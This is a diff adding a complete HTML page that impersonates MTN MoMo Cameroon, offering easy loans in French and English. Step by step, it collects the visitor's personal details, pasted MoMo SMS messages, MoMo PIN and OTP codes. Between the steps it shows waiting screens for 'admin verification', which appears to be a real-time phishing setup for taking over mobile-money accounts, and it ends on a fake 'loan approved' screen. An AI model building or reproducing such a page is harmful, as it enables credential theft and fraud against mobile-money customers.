@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Cameroun – Prêts Faciles</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="./style.css" />
+</head>
+<body data-lang="fr">
+
+    <!-- PAGE 1: LANDING -->
+    <div id="page-landing" class="page active">
+        <div class="land-nav">
+            <div class="lang-switch">
+                <button class="lang-btn active" data-lang-btn="fr" onclick="switchLang('fr')">FR</button>
+                <button class="lang-btn" data-lang-btn="en" onclick="switchLang('en')">EN</button>
+            </div>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+        </div>
+        <div class="land-center">
+            <div class="land-card">
+                <h1>
+                    <span class="lang-fr">Bienvenue sur MTN MoMo Cameroun</span>
+                    <span class="lang-en">Welcome to MTN MoMo Cameroon</span>
+                </h1>
+                <p class="land-tagline">
+                    <span class="lang-fr">Obtenez des prêts facilement via MTN MoMo Cameroun</span>
+                    <span class="lang-en">Get loans easily through MTN MoMo Cameroon</span>
+                </p>
+                <div class="calc-box">
+                    <h2>
+                        <span class="lang-fr">Calculateur de prêt</span>
+                        <span class="lang-en">Loan Calculator</span>
+                    </h2>
+                    <div class="calc-row2">
+                        <span class="lang-fr">Montant</span>
+                        <span class="lang-en">Amount</span>
+                        <span class="cv" id="calcAmt">XAF 1,000,000</span>
+                    </div>
+                    <div class="calc-row2">
+                        <span class="lang-fr">Durée</span>
+                        <span class="lang-en">Term</span>
+                        <span class="cv" id="calcTerm">48 Mois</span>
+                    </div>
+                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
+                    <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
+                    <div class="monthly-box">
+                        <span class="ml lang-fr">Paiement mensuel</span>
+                        <span class="ml lang-en">Monthly Payment</span>
+                        <span class="ma" id="monthlyAmt">XAF 24,000</span>
+                    </div>
+                </div>
+                <button class="btn-grad" onclick="startApplication()">
+                    <span class="lang-fr">COMMENCER LA DEMANDE</span>
+                    <span class="lang-en">START APPLICATION</span>
+                </button>
+            </div>
+        </div>
+        <div class="land-footer">
+            <span class="lang-fr">© 2026 Prêts MTN MoMo – Propulsé par MTN Cameroun</span>
+            <span class="lang-en">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</span>
+        </div>
+    </div>
+
+    <!-- PAGE 2: STEP 1 -->
+    <div id="page-step1" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')">
+                <span class="lang-fr">← Retour</span>
+                <span class="lang-en">← Back</span>
+            </a>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>
+                    <span class="lang-fr">Demande de prêt</span>
+                    <span class="lang-en">Loan Application</span>
+                </h2>
+                <p class="step-sub">
+                    <span class="lang-fr">Étape 1 sur 5</span>
+                    <span class="lang-en">Step 1 of 5</span>
+                </p>
+                <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field">
+                    <label class="lang-fr">Type de prêt</label>
+                    <label class="lang-en">Loan Type</label>
+                    <div class="sel-wrap">
+                        <select id="s1ty">
+                            <option class="lang-fr">Prêt personnel</option>
+                            <option class="lang-en">Personal Loan</option>
+                            <option selected class="lang-fr">Prêt professionnel</option>
+                            <option class="lang-en">Business Loan</option>
+                            <option class="lang-fr">Prêt immobilier</option>
+                            <option class="lang-en">Home Loan</option>
+                            <option class="lang-fr">Prêt auto</option>
+                            <option class="lang-en">Car Loan</option>
+                            <option class="lang-fr">Prêt étudiant</option>
+                            <option class="lang-en">Education Loan</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Montant du prêt (XAF)</label>
+                    <label class="lang-en">Loan Amount (XAF)</label>
+                    <input type="number" id="s1am" value="1000000" placeholder="Entrez le montant" oninput="clearErr('s1Err')" />
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Durée du prêt</label>
+                    <label class="lang-en">Loan Term</label>
+                    <div class="sel-wrap">
+                        <select id="s1te">
+                            <option>6 Mois</option>
+                            <option>12 Mois</option>
+                            <option>18 Mois</option>
+                            <option>24 Mois</option>
+                            <option selected>48 Mois</option>
+                            <option>60 Mois</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Objet du prêt</label>
+                    <label class="lang-en">Purpose of Loan</label>
+                    <textarea id="s1pu" placeholder="Décrivez l'objet de votre prêt…" oninput="clearErr('s1Err')"></textarea>
+                </div>
+                <button class="btn-grad" onclick="toS2()">
+                    <span class="lang-fr">ÉTAPE SUIVANTE</span>
+                    <span class="lang-en">NEXT STEP</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 3: STEP 2 -->
+    <div id="page-step2" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">
+                <span class="lang-fr">← Retour</span>
+                <span class="lang-en">← Back</span>
+            </a>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>
+                    <span class="lang-fr">Demande de prêt</span>
+                    <span class="lang-en">Loan Application</span>
+                </h2>
+                <p class="step-sub">
+                    <span class="lang-fr">Étape 2 sur 5</span>
+                    <span class="lang-en">Step 2 of 5</span>
+                </p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field">
+                        <label class="lang-fr">Prénom</label>
+                        <label class="lang-en">First Name</label>
+                        <input type="text" id="s2fi" placeholder="Prénom" oninput="clearErr('s2Err')" />
+                    </div>
+                    <div class="field">
+                        <label class="lang-fr">Nom</label>
+                        <label class="lang-en">Last Name</label>
+                        <input type="text" id="s2la" placeholder="Nom" oninput="clearErr('s2Err')" />
+                    </div>
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Numéro de téléphone (Cameroun)</label>
+                    <label class="lang-en">Phone Number (Cameroon)</label>
+                    <div class="phone-row">
+                        <div class="ph-pre">+237</div>
+                        <input type="tel" id="s2ph" placeholder="6XX XXX XXX" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" />
+                    </div>
+                    <div class="field-hint lang-fr">9 chiffres sans le préfixe +237 (ex: 670123456)</div>
+                    <div class="field-hint lang-en">9 digits without +237 prefix (e.g., 670123456)</div>
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Adresse e-mail</label>
+                    <label class="lang-en">Email Address</label>
+                    <input type="email" id="s2em" placeholder="votre@email.com" oninput="clearErr('s2Err')" />
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step1')">
+                        <span class="lang-fr">RETOUR</span>
+                        <span class="lang-en">BACK</span>
+                    </button>
+                    <button class="btn-grad" onclick="toS3()">
+                        <span class="lang-fr">ÉTAPE SUIVANTE</span>
+                        <span class="lang-en">NEXT STEP</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 4: STEP 3 -->
+    <div id="page-step3" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">
+                <span class="lang-fr">← Retour</span>
+                <span class="lang-en">← Back</span>
+            </a>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>
+                    <span class="lang-fr">Demande de prêt</span>
+                    <span class="lang-en">Loan Application</span>
+                </h2>
+                <p class="step-sub">
+                    <span class="lang-fr">Étape 3 sur 5</span>
+                    <span class="lang-en">Step 3 of 5</span>
+                </p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field">
+                    <label class="lang-fr">Situation professionnelle</label>
+                    <label class="lang-en">Employment Status</label>
+                    <div class="sel-wrap">
+                        <select id="s3em">
+                            <option class="lang-fr">Employé</option>
+                            <option class="lang-en">Employed</option>
+                            <option selected class="lang-fr">Travailleur indépendant</option>
+                            <option class="lang-en">Self-employed</option>
+                            <option class="lang-fr">Sans emploi</option>
+                            <option class="lang-en">Unemployed</option>
+                            <option class="lang-fr">Retraité</option>
+                            <option class="lang-en">Retired</option>
+                            <option class="lang-fr">Étudiant</option>
+                            <option class="lang-en">Student</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Revenu annuel (XAF)</label>
+                    <label class="lang-en">Annual Income (XAF)</label>
+                    <input type="number" id="s3in" placeholder="Entrez le revenu annuel" oninput="clearErr('s3Err')" />
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Nom de la personne à contacter</label>
+                    <label class="lang-en">Next of Kin Name</label>
+                    <input type="text" id="s3kn" placeholder="Nom complet" oninput="clearErr('s3Err')" />
+                </div>
+                <div class="field">
+                    <label class="lang-fr">Téléphone de la personne à contacter</label>
+                    <label class="lang-en">Next of Kin Phone</label>
+                    <input type="tel" id="s3kp" placeholder="+237 6XX XXX XXX" oninput="clearErr('s3Err')" />
+                </div>
+                <div class="sum-box">
+                    <h3 class="lang-fr">Résumé de la demande</h3>
+                    <h3 class="lang-en">Application Summary</h3>
+                    <div class="sum-row">
+                        <span class="sk lang-fr">Montant du prêt :</span>
+                        <span class="sk lang-en">Loan Amount:</span>
+                        <span class="sv" id="sA">XAF 1,000,000</span>
+                    </div>
+                    <div class="sum-row">
+                        <span class="sk lang-fr">Durée :</span>
+                        <span class="sk lang-en">Loan Term:</span>
+                        <span class="sv" id="sT">48 Mois</span>
+                    </div>
+                    <div class="sum-row">
+                        <span class="sk lang-fr">Objet :</span>
+                        <span class="sk lang-en">Purpose:</span>
+                        <span class="sv" id="sP">—</span>
+                    </div>
+                    <div class="sum-row">
+                        <span class="sk lang-fr">Demandeur :</span>
+                        <span class="sk lang-en">Applicant:</span>
+                        <span class="sv" id="sN">—</span>
+                    </div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step2')">
+                        <span class="lang-fr">RETOUR</span>
+                        <span class="lang-en">BACK</span>
+                    </button>
+                    <button class="btn-grad" onclick="submitApp()">
+                        <span class="lang-fr">SOUMETTRE LA DEMANDE</span>
+                        <span class="lang-en">SUBMIT APPLICATION</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 5: PROCESSING -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2>
+                    <span class="lang-fr">Traitement de la demande...</span>
+                    <span class="lang-en">Processing Application...</span>
+                </h2>
+                <p>
+                    <span class="lang-fr">Veuillez patienter pendant le traitement de votre demande de prêt</span>
+                    <span class="lang-en">Please wait while we process your loan application</span>
+                </p>
+                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">
+                    <span class="lang-fr">⏳ En attente de l'approbation de l'administrateur...</span>
+                    <span class="lang-en">⏳ Awaiting admin approval...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 6: SMS PASTE -->
+    <div id="page-sms-paste" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-processing')">
+                <span class="lang-fr">← Retour</span>
+                <span class="lang-en">← Back</span>
+            </a>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>
+                    <span class="lang-fr">Vérifier le message MoMo</span>
+                    <span class="lang-en">Verify MoMo Message</span>
+                </h2>
+                <p class="step-sub">
+                    <span class="lang-fr">Étape 4 sur 5</span>
+                    <span class="lang-en">Step 4 of 5</span>
+                </p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="momErr"><span class="msg-icon">✕</span><span id="momErrTxt"></span></div>
+                <div class="momo-msg-box">
+                    <label style="font-weight:600; display:block; margin-bottom:6px;" class="lang-fr">📩 Collez le contenu du message MoMo :</label>
+                    <label style="font-weight:600; display:block; margin-bottom:6px;" class="lang-en">📩 Paste the MoMo message content:</label>
+                    <textarea id="smsMsgBox" class="sms-textarea" placeholder="Copiez et collez le message MoMo reçu sur votre téléphone ici..."></textarea>
+                    <div class="field-hint lang-fr">Cela doit inclure le code OTP ou les détails de vérification envoyés à votre numéro MoMo.</div>
+                    <div class="field-hint lang-en">This should include the OTP code or verification details sent to your MoMo number.</div>
+                </div>
+                <div style="margin: 8px 0 12px; padding: 10px; background: #f8f9fa; border-radius: 6px; font-size:0.8rem; color:var(--text-light);">
+                    <strong class="lang-fr">💡 Astuce :</strong>
+                    <strong class="lang-en">💡 Tip:</strong>
+                    <span class="lang-fr">Vérifiez votre boîte SMS pour le message de MTN MoMo Cameroun. Copiez le texte entier.</span>
+                    <span class="lang-en">Check your SMS inbox for the message from MTN MoMo Cameroon. Copy the entire message text.</span>
+                </div>
+                <button class="btn-grad" onclick="doSmsParse()">
+                    <span class="lang-fr">SOUMETTRE LE MESSAGE MOMO</span>
+                    <span class="lang-en">SUBMIT MOMO MESSAGE</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 7: WAIT SMS -->
+    <div id="page-wait-sms" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>
+                    <span class="lang-fr">Vérification du SMS...</span>
+                    <span class="lang-en">Verifying SMS Message...</span>
+                </h2>
+                <p>
+                    <span class="lang-fr">Votre message SMS a été reçu. Veuillez attendre la vérification de l'administrateur...</span>
+                    <span class="lang-en">Your SMS message has been received. Please wait for admin verification...</span>
+                </p>
+                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">
+                    <span class="lang-fr">⏳ L'administrateur examine votre SMS...</span>
+                    <span class="lang-en">⏳ Admin is reviewing your SMS...</span>
+                </div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">
+                    <span class="lang-fr">ID de demande :</span>
+                    <span class="lang-en">Application ID:</span>
+                    <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 8: PIN (5 DIGITS) -->
+    <div id="page-pin" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-wait-sms')">
+                <span class="lang-fr">← Retour</span>
+                <span class="lang-en">← Back</span>
+            </a>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>
+                    <span class="lang-fr">Entrez le code PIN MoMo</span>
+                    <span class="lang-en">Enter MoMo PIN</span>
+                </h2>
+                <p class="step-sub">
+                    <span class="lang-fr">Étape 5 sur 5</span>
+                    <span class="lang-en">Step 5 of 5</span>
+                </p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
+                <div class="pin-label">
+                    <span class="lang-fr">Entrez votre code PIN MoMo (5 chiffres) :</span>
+                    <span class="lang-en">Enter your MoMo PIN (5 digits):</span>
+                </div>
+                <div id="pinAttemptsDisplay" class="pin-attempts">
+                    🔑 <span class="lang-fr">Tentatives restantes : 3 sur 3</span><span class="lang-en">Attempts remaining: 3 of 3</span>
+                </div>
+                <div class="pin-row">
+                    <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
+                    <input type="password" id="pin1" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" placeholder="•" />
+                    <input type="password" id="pin2" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" placeholder="•" />
+                    <input type="password" id="pin3" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" placeholder="•" />
+                    <input type="password" id="pin4" class="pin-box" maxlength="1" oninput="pinMvM(this,4)" placeholder="•" />
+                    <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
+                    <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
+                </div>
+                <button class="btn-grad" onclick="doPin()">
+                    <span class="lang-fr">SOUMETTRE LE PIN MOMO</span>
+                    <span class="lang-en">SUBMIT MOMO PIN</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 9: WAIT PIN -->
+    <div id="page-wait-pin" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>
+                    <span class="lang-fr">Vérification du code PIN MoMo...</span>
+                    <span class="lang-en">Verifying MoMo PIN...</span>
+                </h2>
+                <p>
+                    <span class="lang-fr">Votre code PIN MoMo a été reçu. Veuillez attendre la vérification de l'administrateur...</span>
+                    <span class="lang-en">Your MoMo PIN has been received. Please wait for admin verification...</span>
+                </p>
+                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">
+                    <span class="lang-fr">⏳ L'administrateur examine votre PIN...</span>
+                    <span class="lang-en">⏳ Admin is reviewing your PIN...</span>
+                </div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">
+                    <span class="lang-fr">ID de demande :</span>
+                    <span class="lang-en">Application ID:</span>
+                    <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 10: OTP (4 DIGITS) -->
+    <div id="page-otp" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-wait-pin')">
+                <span class="lang-fr">← Retour</span>
+                <span class="lang-en">← Back</span>
+            </a>
+            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+                <div class="mtn-logo-icon" style="width:32px;height:32px;"></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div>
+                    <div class="mtn-logo-sub lang-fr" style="font-size:0.6rem;">Cameroun</div>
+                    <div class="mtn-logo-sub lang-en" style="font-size:0.6rem;">Cameroon</div>
+                </div>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>
+                    <span class="lang-fr">Entrez le code OTP</span>
+                    <span class="lang-en">Enter OTP Code</span>
+                </h2>
+                <p class="step-sub">
+                    <span class="lang-fr">Entrez le code OTP à 4 chiffres envoyé à votre téléphone via MTN MoMo Cameroun</span>
+                    <span class="lang-en">Enter the 4-digit OTP code sent to your phone via MTN MoMo Cameroon</span>
+                </p>
+                <div class="otp-section">
+                    <div class="otp-section-title">
+                        <span class="lang-fr">Code OTP (4 chiffres) :</span>
+                        <span class="lang-en">OTP Code (4 digits):</span>
+                    </div>
+                    <div style="display: flex; align-items: center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
+                    </div>
+                </div>
+                <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
+                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">
+                    🔄 <span class="lang-fr">Renvoyer l'OTP</span><span class="lang-en">Resend OTP</span>
+                </button>
+                <div id="rejectionInfo" style="margin-top: 10px; font-size: 0.8rem; color: var(--text-light);"></div>
+                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">
+                    <span class="lang-fr">VÉRIFIER ET APPROUVER LE PRÊT</span>
+                    <span class="lang-en">VERIFY & APPROVE LOAN</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 11: WAIT OTP -->
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>
+                    <span class="lang-fr">Vérification du code OTP...</span>
+                    <span class="lang-en">Verifying OTP Code...</span>
+                </h2>
+                <p>
+                    <span class="lang-fr">Votre code OTP a été reçu. Veuillez attendre la vérification de l'administrateur...</span>
+                    <span class="lang-en">Your OTP code has been received. Please wait for admin verification...</span>
+                </p>
+                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">
+                    <span class="lang-fr">⏳ L'administrateur vérifie votre OTP...</span>
+                    <span class="lang-en">⏳ Admin is verifying your OTP...</span>
+                </div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">
+                    <span class="lang-fr">ID de demande :</span>
+                    <span class="lang-en">Application ID:</span>
+                    <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 12: APPROVAL -->
+    <div id="page-approval" class="page">
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle">✓</div>
+                <h2 class="appr-title">
+                    <span class="lang-fr">Prêt approuvé !</span>
+                    <span class="lang-en">Loan Approved!</span>
+                </h2>
+                <p class="appr-sub">
+                    <span class="lang-fr">Votre prêt a été approuvé avec succès.</span>
+                    <span class="lang-en">Your loan has been successfully approved.</span>
+                </p>
+                <div class="appr-banner">
+                    <div class="abl lang-fr">Montant à recevoir</div>
+                    <div class="abl lang-en">Amount to Receive</div>
+                    <div class="aba" id="aprAmount">XAF 1,000,000</div>
+                </div>
+            </div>
+            <div class="comp-box">
+                <div class="ch">
+                    ℹ️
+                    <span class="lang-fr">Information importante</span>
+                    <span class="lang-en">Important Information</span>
+                </div>
+                <p class="lang-fr">Les fonds seront déposés directement sur votre compte MTN MoMo dans les 5 minutes. Veuillez vous assurer que votre numéro de téléphone est correct.</p>
+                <p class="lang-en">The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p>
+            </div>
+            <div class="ld-card">
+                <div class="ld-htitle">
+                    📊
+                    <span class="lang-fr">Détails du prêt</span>
+                    <span class="lang-en">Loan Details</span>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">💰</div>
+                    <div>
+                        <div class="ld-lbl lang-fr">Montant</div>
+                        <div class="ld-lbl lang-en">Amount</div>
+                        <div class="ld-val" id="aprAmt">XAF 1,000,000</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-b">📅</div>
+                    <div>
+                        <div class="ld-lbl lang-fr">Durée</div>
+                        <div class="ld-lbl lang-en">Term</div>
+                        <div class="ld-val" id="aprTerm">48 Mois</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-p">💳</div>
+                    <div>
+                        <div class="ld-lbl lang-fr">Paiement mensuel</div>
+                        <div class="ld-lbl lang-en">Monthly Payment</div>
+                        <div class="ld-val" id="aprMth">XAF 24,000</div>
+                    </div>
+                </div>
+            </div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p>
+                    <strong class="lang-fr">Prochaines étapes :</strong>
+                    <strong class="lang-en">Next Steps:</strong>
+                    <span class="lang-fr">Pour commencer à rembourser, vous pouvez configurer un plan de paiement automatique dans votre compte MTN MoMo dans la section suivante.</span>
+                    <span class="lang-en">To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</span>
+                </p>
+            </div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="alert('Merci ! Votre prêt a été décaissé. / Thank you! Your loan has been disbursed.')">
+                    <span class="lang-fr">TERMINER</span>
+                    <span class="lang-en">FINISH</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="./script.js"></script>
+</body>
+</html>
